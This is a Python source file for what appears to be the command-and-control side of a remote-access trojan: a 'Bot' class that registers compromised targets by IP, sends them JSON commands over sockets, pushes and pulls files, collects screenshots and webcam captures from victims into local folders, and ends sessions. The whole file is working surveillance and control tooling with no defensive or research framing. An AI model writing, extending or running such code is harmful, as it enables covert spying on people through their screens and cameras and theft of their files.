import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading

# Constants
SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
IMAGE_CHUNK_SIZE = 10485760 #10MB
SCREENSHOT_TIMEOUT = 10 # seconds
WEBCAM_TIMEOUT = 10 # seconds
ENCODING = 'utf-8'

class Bot:
    botList = {}
    botCount = 0
    
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.alias = "bot"
        self.id = Bot.botCount
        Bot.botList[self.id] = self
        Bot.botCount += 1

    def reliable_send(self, data):
        jsondata = json.dumps(data)
        while True:
            try:
                self.target.send(jsondata.encode(ENCODING))
                break
            except BrokenPipeError:
                break
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                break

    def reliable_recv(self):
        data = ''
        while True:
            try:
                data += self.target.recv(1024).decode(ENCODING).rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except socket.error as e:
                print(f"Socket error: {e}")
                return None
            except Exception as e:
                print(f"Unexpected error: {e}")
                return None

    def upload_file(self, file_name):
        try:
            f = open(file_name, 'rb')
            data = f.read()
            f.close()
        except FileNotFoundError:
            return f"The file {file_name} does not exist."
        except IOError as e:
            return f"Error reading from {file_name}: {e}"

        try:
            self.target.send(data)
        except socket.error as e:
            return f"Error sending data: {e}"

        return f"File {file_name} uploaded successfully."

    def download_file(self, file_name):
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(2)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(1024)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"File {file_name} downloaded successfully."

    def screenshot(self):
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        count = len(os.listdir(SCREENSHOT_DIR))
        file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
        
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(SCREENSHOT_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"Screenshot saved to {file_name}"

    def webcam(self):
        os.makedirs(WEBCAM_DIR, exist_ok=True)
        count = len(os.listdir(WEBCAM_DIR))
        file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
        
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(WEBCAM_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"Webcam image saved to {file_name}"

    def kill(self):
        try:
            self.reliable_send('quit')
            self.target.close()
            del Bot.botList[self.id]
            return "Session terminated successfully"
        except Exception as e:
            return f"Error terminating session: {e}" 